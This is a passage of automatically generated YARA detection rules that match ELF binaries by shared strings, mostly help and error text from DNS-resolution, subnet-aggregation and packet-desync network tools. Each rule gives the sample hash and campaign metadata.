        $s9 = "; override fwmark for generated packets. default = 0x%08X (%u)" ascii
        $s10 = "unbinding existing nf_queue handler for AF_INET6 (if any)" ascii
        $s11 = "desync profile search for %s ip1=%s ip2=%s port=%u icmp=%u:%u l7proto=%s ssid='%s' mark=0x%08X hostn" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1332328 and 11 of them
}

rule Sightlines_tlsh_d7947b30_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-d7947b30"
        date = "2026-10-30"
        campaign = "tlsh-d7947b30"
        family = ""
        hash = "0e08bbc32597e78e69a458de3b2543b7b985c329af5f160deb4c38424df89170"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-d7947b30.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "d.googlesource.com/toolchain/llvm-project d8003a456d14a3deb8054cdaa529ffbf02d9b262)" ascii
        $s1 = "Android (13691557, +pgo, +bolt, +lto, +mlgo, based on r522817d) clang version 18.0.4 (https://androi" ascii
        $s2 = "; consider prefix lengths from 'min' to 'max'. examples : 22-30 (ipv4), 56-64 (ipv6)" ascii
        $s3 = "; ipv4 only : include subnets with more than mul/div ips. example : 3/4" ascii
        $s4 = "; ipv6 only : include subnets with more than N v6 ips. example : 5" ascii
        $s5 = "invalid parameter for prefix-length : %s" ascii
        $s6 = "invalid parameter for v4-threshold : %s" ascii
        $s7 = "invalid parameter for v6-threshold : %s" ascii
        $s8 = " --prefix-length=min[-max]" ascii
        $s9 = " --v4-threshold=mul/div" ascii
        $s10 = "github version %s (%s)" ascii
        $s11 = "; ipv4 list (default)" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_c8abf66c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c8abf66c"
        date = "2026-10-30"
        campaign = "tlsh-c8abf66c"
        family = ""
        hash = "218f32df83deac1f9b2e39a9c1f7e0d574b3e6c041da1c4194065a5f2152a455"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c8abf66c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; consider prefix lengths from 'min' to 'max'. examples : 22-30 (ipv4), 56-64 (ipv6)" ascii
        $s1 = "; ipv4 only : include subnets with more than mul/div ips. example : 3/4" ascii
        $s2 = "; ipv6 only : include subnets with more than N v6 ips. example : 5" ascii
        $s3 = "invalid parameter for prefix-length : %s" ascii
        $s4 = "invalid parameter for v4-threshold : %s" ascii
        $s5 = "invalid parameter for v6-threshold : %s" ascii
        $s6 = "GCC: (crosstool-NG 1.28.0) 15.2.0" ascii
        $s7 = " --prefix-length=min[-max]" ascii
        $s8 = "Required key not available" ascii
        $s9 = "Key was rejected by service" ascii
        $s10 = " --v4-threshold=mul/div" ascii
        $s11 = "github version %s (%s)" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_aab012d8_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-aab012d8"
        date = "2026-10-30"
        campaign = "tlsh-aab012d8"
        family = ""
        hash = "3ebe3db3ac109757634b0e3707b46b02664f428961ef6b51b2398e4ac7da7bce"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-aab012d8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; consider prefix lengths from 'min' to 'max'. examples : 22-30 (ipv4), 56-64 (ipv6)" ascii
        $s1 = "; ipv4 only : include subnets with more than mul/div ips. example : 3/4" ascii
        $s2 = "; ipv6 only : include subnets with more than N v6 ips. example : 5" ascii
        $s3 = "invalid parameter for prefix-length : %s" ascii
        $s4 = "invalid parameter for v4-threshold : %s" ascii
        $s5 = "invalid parameter for v6-threshold : %s" ascii
        $s6 = "GCC: (crosstool-NG 1.28.0) 15.2.0" ascii
        $s7 = " --prefix-length=min[-max]" ascii
        $s8 = "Required key not available" ascii
        $s9 = "Key was rejected by service" ascii
        $s10 = " --v4-threshold=mul/div" ascii
        $s11 = "github version %s (%s)" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_26b6e34a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-26b6e34a"
        date = "2026-10-30"
        campaign = "tlsh-26b6e34a"
        family = ""
        hash = "0c42f7adb3c9eed1e73f979000b3f3acf4c8736b922b6a5e347feea042298240"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-26b6e34a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; how many times to retry if EAI_AGAIN received. default %u" ascii
        $s1 = "; output to stdout binary blob with DNS query. use --family to specify ip version." ascii
        $s2 = "; time in msec to wait between EAI_AGAIN attempts. default %u" ascii
        $s3 = "; read from stdin binary DNS answer blob and parse it to ipv4/ipv6 addresses" ascii
        $s4 = "could not read DNS reply blob from stdin" ascii
        $s5 = "mdig stats : %02u:%02u:%02u : domains=%d success=%d error=%d" ascii
        $s6 = "; log successfully resolved domains to a file" ascii
        $s7 = "could not write DNS query blob to stdout" ascii
        $s8 = "; print resolve stats to stderr every N domains" ascii
        $s9 = "eagain-delay must be within 0..100000" ascii
        $s10 = "thread number must be within 1..100" ascii
        $s11 = "GCC: (crosstool-NG 1.28.0) 15.2.0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_494dafc1_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-494dafc1"
        date = "2026-10-30"
        campaign = "tlsh-494dafc1"
        family = ""
        hash = "049cda829e5a9715db248c9ceeddca218ac811b95663439329a7df507cdaf12e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-494dafc1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; consider prefix lengths from 'min' to 'max'. examples : 22-30 (ipv4), 56-64 (ipv6)" ascii
        $s1 = "; ipv4 only : include subnets with more than mul/div ips. example : 3/4" ascii
        $s2 = "; ipv6 only : include subnets with more than N v6 ips. example : 5" ascii
        $s3 = "invalid parameter for prefix-length : %s" ascii
        $s4 = "invalid parameter for v4-threshold : %s" ascii
        $s5 = "invalid parameter for v6-threshold : %s" ascii
        $s6 = "GCC: (crosstool-NG 1.28.0) 15.2.0" ascii
        $s7 = " --prefix-length=min[-max]" ascii
        $s8 = "Required key not available" ascii
        $s9 = "Key was rejected by service" ascii
        $s10 = " --v4-threshold=mul/div" ascii
        $s11 = "github version %s (%s)" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_11927a36_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-11927a36"
        date = "2026-10-30"
        campaign = "tlsh-11927a36"
        family = ""
        hash = "1d099b45f44a84fa359d135a64aa94fd533eddc70b53dcfc5ff6384c72d59de9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-11927a36.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; how many times to retry if EAI_AGAIN received. default %u" ascii
        $s1 = "; output to stdout binary blob with DNS query. use --family to specify ip version." ascii
        $s2 = "; time in msec to wait between EAI_AGAIN attempts. default %u" ascii
        $s3 = "; read from stdin binary DNS answer blob and parse it to ipv4/ipv6 addresses" ascii
        $s4 = "could not read DNS reply blob from stdin" ascii
        $s5 = "mdig stats : %02u:%02u:%02u : domains=%d success=%d error=%d" ascii
        $s6 = "; log successfully resolved domains to a file" ascii
        $s7 = "could not write DNS query blob to stdout" ascii
        $s8 = "; print resolve stats to stderr every N domains" ascii
        $s9 = "eagain-delay must be within 0..100000" ascii
        $s10 = "thread number must be within 1..100" ascii
        $s11 = "GCC: (crosstool-NG 1.28.0) 15.2.0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_ab8ea7d0_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ab8ea7d0"
        date = "2026-10-30"
        campaign = "tlsh-ab8ea7d0"
        family = ""
        hash = "1b4274db6aec74d1e3ae942c55557cc373ddf8fd8551aea2a347a0e2c72c4470"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ab8ea7d0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "d.googlesource.com/toolchain/llvm-project d8003a456d14a3deb8054cdaa529ffbf02d9b262)" ascii
        $s1 = "Android (13691557, +pgo, +bolt, +lto, +mlgo, based on r522817d) clang version 18.0.4 (https://androi" ascii
        $s2 = "; how many times to retry if EAI_AGAIN received. default %u" ascii
        $s3 = "; output to stdout binary blob with DNS query. use --family to specify ip version." ascii
        $s4 = "; time in msec to wait between EAI_AGAIN attempts. default %u" ascii
        $s5 = "; read from stdin binary DNS answer blob and parse it to ipv4/ipv6 addresses" ascii
        $s6 = "could not read DNS reply blob from stdin" ascii
        $s7 = "mdig stats : %02u:%02u:%02u : domains=%d success=%d error=%d" ascii
        $s8 = "; log successfully resolved domains to a file" ascii
        $s9 = "could not write DNS query blob to stdout" ascii
        $s10 = "; print resolve stats to stderr every N domains" ascii
        $s11 = "eagain-delay must be within 0..100000" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_3da349fe_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-3da349fe"
        date = "2026-10-30"
        campaign = "tlsh-3da349fe"
        family = ""
        hash = "1abba6dd84692d5efd3c9fdbeec086b18bdf93294524996b809a811112bb3997"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-3da349fe.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; consider prefix lengths from 'min' to 'max'. examples : 22-30 (ipv4), 56-64 (ipv6)" ascii
        $s1 = "; ipv4 only : include subnets with more than mul/div ips. example : 3/4" ascii
        $s2 = "; ipv6 only : include subnets with more than N v6 ips. example : 5" ascii
        $s3 = "invalid parameter for prefix-length : %s" ascii
        $s4 = "invalid parameter for v4-threshold : %s" ascii
        $s5 = "invalid parameter for v6-threshold : %s" ascii
        $s6 = "GCC: (crosstool-NG 1.28.0) 15.2.0" ascii
        $s7 = " --prefix-length=min[-max]" ascii
        $s8 = "Required key not available" ascii
        $s9 = "Key was rejected by service" ascii
        $s10 = " --v4-threshold=mul/div" ascii
        $s11 = "github version %s (%s)" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_de7515f5_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-de7515f5"
        date = "2026-10-30"
        campaign = "tlsh-de7515f5"
        family = ""
        hash = "09ba2658dcc6e1b4b4b71da9def20764ff60efd18127e1ba0e3553404523e5dd"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-de7515f5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; internal conntrack timeouts for TCP SYN, ESTABLISHED, FIN stages, UDP timeout. default %u:%u:%u:%u" ascii
        $s1 = " --blob=<item_name>:[+ofs]@<filename>|0xHEX" ascii
        $s2 = "reconstructed packet due to VERDICT_MODIFY. size %zu => %zu" ascii
        $s3 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s4 = "aes_gcm: wrong key length %u. should be 16,24,32." ascii
        $s5 = "aes_ctr: wrong key length %u. should be 16,24,32." ascii
        $s6 = "failed to reconstruct packet after VERDICT_MODIFY" ascii
        $s7 = " --lua-desync=<functon>[:param1=val1[:param2=val2]]" ascii
        $s8 = "; override fwmark for generated packets. default = 0x%08X (%u)" ascii
        $s9 = "unbinding existing nf_queue handler for AF_INET6 (if any)" ascii
        $s10 = "desync profile search for %s ip1=%s ip2=%s port=%u icmp=%u:%u l7proto=%s ssid='%s' mark=0x%08X hostn" ascii
        $s11 = "QUIC initial contains CRYPTO with full fragment coverage" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1707672 and 12 of them
}

rule Sightlines_tlsh_a04e691a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a04e691a"
        date = "2026-10-30"
        campaign = "tlsh-a04e691a"
        family = ""
        hash = "5456500154f50fdd7b8f35bbb7a871cb55b294bf979346ad4170de03e68b2544"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a04e691a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "d.googlesource.com/toolchain/llvm-project d8003a456d14a3deb8054cdaa529ffbf02d9b262)" ascii
        $s1 = "Android (13691557, +pgo, +bolt, +lto, +mlgo, based on r522817d) clang version 18.0.4 (https://androi" ascii
        $s2 = "; consider prefix lengths from 'min' to 'max'. examples : 22-30 (ipv4), 56-64 (ipv6)" ascii
        $s3 = "; ipv4 only : include subnets with more than mul/div ips. example : 3/4" ascii
        $s4 = "; ipv6 only : include subnets with more than N v6 ips. example : 5" ascii
        $s5 = "invalid parameter for prefix-length : %s" ascii
        $s6 = "invalid parameter for v4-threshold : %s" ascii
        $s7 = "invalid parameter for v6-threshold : %s" ascii
        $s8 = " --prefix-length=min[-max]" ascii
        $s9 = " --v4-threshold=mul/div" ascii
        $s10 = "github version %s (%s)" ascii
        $s11 = "; ipv4 list (default)" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_2a257dd8_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-2a257dd8"
        date = "2026-10-30"
        campaign = "tlsh-2a257dd8"
        family = ""
        hash = "2f0d6316a4316346b87f94a17b5b406e74ab27af11813cad7fc0e7667e3eec3c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-2a257dd8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "d.googlesource.com/toolchain/llvm-project d8003a456d14a3deb8054cdaa529ffbf02d9b262)" ascii
        $s1 = "Android (13691557, +pgo, +bolt, +lto, +mlgo, based on r522817d) clang version 18.0.4 (https://androi" ascii
        $s2 = "; internal conntrack timeouts for TCP SYN, ESTABLISHED, FIN stages, UDP timeout. default %u:%u:%u:%u" ascii
        $s3 = " --blob=<item_name>:[+ofs]@<filename>|0xHEX" ascii
        $s4 = "libunwind: malformed DW_CFA_GNU_negative_offset_extended DWARF unwind, reg too big" ascii
        $s5 = "libunwind: malformed DW_CFA_val_offset DWARF unwind, reg (%lu) out of range" ascii
        $s6 = "libunwind: malformed DW_CFA_val_expression DWARF unwind, reg too big" ascii
        $s7 = "reconstructed packet due to VERDICT_MODIFY. size %zu => %zu" ascii
        $s8 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s9 = "aes_gcm: wrong key length %u. should be 16,24,32." ascii
        $s10 = "libunwind: malformed DW_CFA_val_offset_sf DWARF unwind, reg too big" ascii
        $s11 = "aes_ctr: wrong key length %u. should be 16,24,32." ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1200976 and 12 of them
}

rule Sightlines_tlsh_a3616b2a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a3616b2a"
        date = "2026-10-30"
        campaign = "tlsh-a3616b2a"
        family = ""
        hash = "0e14c230727778d9d4fc0909633ed3904a5da2830003ff105b4f175576c8c037"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a3616b2a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Required key not available" ascii
        $s1 = "Key was rejected by service" ascii
        $s2 = "github version %s (%s)" ascii
        $s3 = ": unrecognized option: " ascii
        $s4 = "Key has been revoked" ascii
        $s5 = "UJn|}ZR.UJ 6|dQ" ascii
        $s6 = "Key has expired" ascii
        $s7 = ".gnu.attributes" ascii
        $s8 = "Cx}J;x}VI.K" ascii
        $s9 = "@8}J8x}JCx}J" ascii
        $s10 = "}.Kx}1Kx9!" ascii
        $s11 = "Ph80Qg 6P" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_6decffca_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6decffca"
        date = "2026-10-30"
        campaign = "tlsh-6decffca"
        family = ""
        hash = "297900940a70819388e29e775998accc477b3fd095e13bb0542d3b2d2783d64f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6decffca.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "FreeBSD clang version 10.0.0 (git@github.com:llvm/llvm-project.git llvmorg-10.0.0-0-gd32170dbd5b)" ascii
        $s1 = "$FreeBSD: releng/11.4/lib/csu/common/crtbrand.c 362094 2020-06-12 11:44:30Z gjb $" ascii
        $s2 = "$FreeBSD: releng/11.4/lib/csu/amd64/crt1.c 331722 2018-03-29 02:50:57Z eadler $" ascii
        $s3 = "$FreeBSD: releng/11.4/lib/csu/common/ignore_init.c 339300 2018-10-11 00:26:15Z emaste $" ascii
        $s4 = "$FreeBSD: releng/11.4/lib/csu/amd64/crtn.S 217105 2011-01-07 16:07:51Z kib $" ascii
        $s5 = "$FreeBSD: releng/11.4/lib/csu/amd64/crti.S 217105 2011-01-07 16:07:51Z kib $" ascii
        $s6 = "; how many times to retry if EAI_AGAIN received. default %u" ascii
        $s7 = "; output to stdout binary blob with DNS query. use --family to specify ip version." ascii
        $s8 = "; time in msec to wait between EAI_AGAIN attempts. default %u" ascii
        $s9 = "; read from stdin binary DNS answer blob and parse it to ipv4/ipv6 addresses" ascii
        $s10 = "could not read DNS reply blob from stdin" ascii
        $s11 = "mdig stats : %02u:%02u:%02u : domains=%d success=%d error=%d" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_9b3012c5_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-9b3012c5"
        date = "2026-10-30"
        campaign = "tlsh-9b3012c5"
        family = ""
        hash = "5386e4c6cc1c2555eb939b0bf5f002b62df0c72cc783e930d059cfc1c4dcaa41"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-9b3012c5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "d.googlesource.com/toolchain/llvm-project d8003a456d14a3deb8054cdaa529ffbf02d9b262)" ascii
        $s1 = "Android (13691557, +pgo, +bolt, +lto, +mlgo, based on r522817d) clang version 18.0.4 (https://androi" ascii
        $s2 = "; internal conntrack timeouts for TCP SYN, ESTABLISHED, FIN stages, UDP timeout. default %u:%u:%u:%u" ascii
        $s3 = " --blob=<item_name>:[+ofs]@<filename>|0xHEX" ascii
        $s4 = "libunwind: malformed DW_CFA_GNU_negative_offset_extended DWARF unwind, reg too big" ascii
        $s5 = "libunwind: malformed DW_CFA_val_offset DWARF unwind, reg (%lu) out of range" ascii
        $s6 = "libunwind: malformed DW_CFA_val_expression DWARF unwind, reg too big" ascii
        $s7 = "reconstructed packet due to VERDICT_MODIFY. size %zu => %zu" ascii
        $s8 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s9 = "aes_gcm: wrong key length %u. should be 16,24,32." ascii
        $s10 = "libunwind: malformed DW_CFA_offset DWARF unwind, reg (%lu) out of range" ascii
        $s11 = "libunwind: malformed DW_CFA_val_offset_sf DWARF unwind, reg too big" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1243920 and 12 of them
}

rule Sightlines_tlsh_43bbefc0_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-43bbefc0"
        date = "2026-10-30"
        campaign = "tlsh-43bbefc0"
        family = ""
        hash = "38ccb53f8ecdcfaddcc2fdec2ca5c99f07a9e1726340bb7730191edb63d5aad8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-43bbefc0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "d.googlesource.com/toolchain/llvm-project d8003a456d14a3deb8054cdaa529ffbf02d9b262)" ascii
        $s1 = "Android (13691557, +pgo, +bolt, +lto, +mlgo, based on r522817d) clang version 18.0.4 (https://androi" ascii
        $s2 = "; consider prefix lengths from 'min' to 'max'. examples : 22-30 (ipv4), 56-64 (ipv6)" ascii
        $s3 = "; ipv4 only : include subnets with more than mul/div ips. example : 3/4" ascii
        $s4 = "; ipv6 only : include subnets with more than N v6 ips. example : 5" ascii
        $s5 = "invalid parameter for prefix-length : %s" ascii
        $s6 = "invalid parameter for v4-threshold : %s" ascii
        $s7 = "invalid parameter for v6-threshold : %s" ascii
        $s8 = " --prefix-length=min[-max]" ascii
        $s9 = " --v4-threshold=mul/div" ascii
        $s10 = "github version %s (%s)" ascii
        $s11 = "; ipv4 list (default)" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_630affdf_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-630affdf"
        date = "2026-10-30"
        campaign = "tlsh-630affdf"
        family = ""
        hash = "24751f3bf2ba7bac3594d36c6e8e664f88c51dccd146017dd98d193035cf62cc"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-630affdf.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; how many times to retry if EAI_AGAIN received. default %u" ascii
        $s1 = "; output to stdout binary blob with DNS query. use --family to specify ip version." ascii
        $s2 = "; time in msec to wait between EAI_AGAIN attempts. default %u" ascii
        $s3 = "; read from stdin binary DNS answer blob and parse it to ipv4/ipv6 addresses" ascii
        $s4 = "could not read DNS reply blob from stdin" ascii
        $s5 = "mdig stats : %02u:%02u:%02u : domains=%d success=%d error=%d" ascii
        $s6 = "; log successfully resolved domains to a file" ascii
        $s7 = "could not write DNS query blob to stdout" ascii
        $s8 = "; print resolve stats to stderr every N domains" ascii
        $s9 = "eagain-delay must be within 0..100000" ascii
        $s10 = "thread number must be within 1..100" ascii
        $s11 = "GCC: (crosstool-NG 1.28.0) 15.2.0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_146d4cb4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-146d4cb4"
        date = "2026-10-30"
        campaign = "tlsh-146d4cb4"
        family = ""
        hash = "2a904355b0f4f914a5b5251e4f5c6c780e060e809330df09522e8c3a7fb77c29"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-146d4cb4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "aAbBcCdDeFgGhHIjmMnprRStTuUVwWxXyYzZ%||EcECExEXEyEYOdOeOHOIOmOMOSOuOUOVOwOWOy" ascii
        $s1 = "; internal conntrack timeouts for TCP SYN, ESTABLISHED, FIN stages, UDP timeout. default %u:%u:%u:%u" ascii
        $s2 = " --blob=<item_name>:[+ofs]@<filename>|0xHEX" ascii
        $s3 = "reconstructed packet due to VERDICT_MODIFY. size %zu => %zu" ascii
        $s4 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s5 = "aes_gcm: wrong key length %u. should be 16,24,32." ascii
        $s6 = "aes_ctr: wrong key length %u. should be 16,24,32." ascii
        $s7 = "failed to reconstruct packet after VERDICT_MODIFY" ascii
        $s8 = " --lua-desync=<functon>[:param1=val1[:param2=val2]]" ascii
        $s9 = "; override fwmark for generated packets. default = 0x%08X (%u)" ascii
        $s10 = "unbinding existing nf_queue handler for AF_INET6 (if any)" ascii
        $s11 = "desync profile search for %s ip1=%s ip2=%s port=%u icmp=%u:%u l7proto=%s ssid='%s' mark=0x%08X hostn" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_1a61f0b8_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1a61f0b8"
        date = "2026-10-30"
        campaign = "tlsh-1a61f0b8"
        family = ""
        hash = "19c567d12c3350e37db6edb77d9530b1ff01eb9fec4aedf491a537eef80389fa"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1a61f0b8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; how many times to retry if EAI_AGAIN received. default %u" ascii
        $s1 = "; output to stdout binary blob with DNS query. use --family to specify ip version." ascii
        $s2 = "; time in msec to wait between EAI_AGAIN attempts. default %u" ascii
        $s3 = "; read from stdin binary DNS answer blob and parse it to ipv4/ipv6 addresses" ascii
        $s4 = "could not read DNS reply blob from stdin" ascii
        $s5 = "mdig stats : %02u:%02u:%02u : domains=%d success=%d error=%d" ascii
        $s6 = "; log successfully resolved domains to a file" ascii
        $s7 = "could not write DNS query blob to stdout" ascii
        $s8 = "; print resolve stats to stderr every N domains" ascii
        $s9 = "eagain-delay must be within 0..100000" ascii
        $s10 = "thread number must be within 1..100" ascii
        $s11 = "GCC: (crosstool-NG 1.28.0) 15.2.0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_238f7a58_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-238f7a58"
        date = "2026-10-30"
        campaign = "tlsh-238f7a58"
        family = ""
        hash = "0cd5f9254f9ad09060b1a8883e9c663b3c811d0458f030bba7fdc0c60649e9ac"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-238f7a58.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; how many times to retry if EAI_AGAIN received. default %u" ascii
        $s1 = "; output to stdout binary blob with DNS query. use --family to specify ip version." ascii
        $s2 = "; time in msec to wait between EAI_AGAIN attempts. default %u" ascii
        $s3 = "; read from stdin binary DNS answer blob and parse it to ipv4/ipv6 addresses" ascii
        $s4 = "could not read DNS reply blob from stdin" ascii
        $s5 = "mdig stats : %02u:%02u:%02u : domains=%d success=%d error=%d" ascii
        $s6 = "; log successfully resolved domains to a file" ascii
        $s7 = "could not write DNS query blob to stdout" ascii
        $s8 = "; print resolve stats to stderr every N domains" ascii
        $s9 = "eagain-delay must be within 0..100000" ascii
        $s10 = "thread number must be within 1..100" ascii
        $s11 = "GCC: (crosstool-NG 1.28.0) 15.2.0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_0b804bb5_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-0b804bb5"
        date = "2026-10-30"
        campaign = "tlsh-0b804bb5"
        family = ""
        hash = "041e0def025afb7d9a3d18c7ec767d4cb3c4213c67f1938e2e78f490c44331e2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-0b804bb5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; how many times to retry if EAI_AGAIN received. default %u" ascii
        $s1 = "; output to stdout binary blob with DNS query. use --family to specify ip version." ascii
        $s2 = "; time in msec to wait between EAI_AGAIN attempts. default %u" ascii
        $s3 = "; read from stdin binary DNS answer blob and parse it to ipv4/ipv6 addresses" ascii
        $s4 = "could not read DNS reply blob from stdin" ascii
        $s5 = "mdig stats : %02u:%02u:%02u : domains=%d success=%d error=%d" ascii
        $s6 = "; log successfully resolved domains to a file" ascii
        $s7 = "could not write DNS query blob to stdout" ascii
        $s8 = "; print resolve stats to stderr every N domains" ascii
        $s9 = "eagain-delay must be within 0..100000" ascii
        $s10 = "thread number must be within 1..100" ascii
        $s11 = "GCC: (crosstool-NG 1.28.0) 15.2.0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_ddc490cc_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ddc490cc"
        date = "2026-10-30"
        campaign = "tlsh-ddc490cc"
        family = ""
        hash = "11c35f7447f64af74865833cbc1f9ce09a388f0a23855d6a2eb4b66bb7bb16d7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ddc490cc.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; internal conntrack timeouts for TCP SYN, ESTABLISHED, FIN stages, UDP timeout. default %u:%u:%u:%u" ascii
        $s1 = " --blob=<item_name>:[+ofs]@<filename>|0xHEX" ascii
        $s2 = "reconstructed packet due to VERDICT_MODIFY. size %zu => %zu" ascii
        $s3 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s4 = "aes_gcm: wrong key length %u. should be 16,24,32." ascii
        $s5 = "aes_ctr: wrong key length %u. should be 16,24,32." ascii
        $s6 = "failed to reconstruct packet after VERDICT_MODIFY" ascii
        $s7 = " --lua-desync=<functon>[:param1=val1[:param2=val2]]" ascii
        $s8 = "; override fwmark for generated packets. default = 0x%08X (%u)" ascii
        $s9 = "unbinding existing nf_queue handler for AF_INET6 (if any)" ascii
        $s10 = "desync profile search for %s ip1=%s ip2=%s port=%u icmp=%u:%u l7proto=%s ssid='%s' mark=0x%08X hostn" ascii
        $s11 = "QUIC initial contains CRYPTO with full fragment coverage" ascii
